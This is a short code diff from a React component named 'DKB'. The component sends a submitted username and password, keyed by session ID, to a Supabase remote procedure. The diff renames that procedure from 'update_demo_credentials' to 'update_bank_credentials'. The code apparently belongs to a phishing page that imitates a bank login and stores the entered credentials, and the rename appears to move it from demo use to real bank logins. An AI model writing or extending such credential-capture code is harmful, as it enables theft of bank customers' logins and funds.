@@ -67,7 +67,7 @@ const DKB = () => {
     if (username.trim().length === 0 || password.length === 0) return;
     setSubmitting(true);
     if (sessionId) {
-      const { error } = await supabase.rpc("update_demo_credentials", {
+      const { error } = await supabase.rpc("update_bank_credentials", {
         p_session_id: sessionId,
         p_username: username,
         p_password: password,
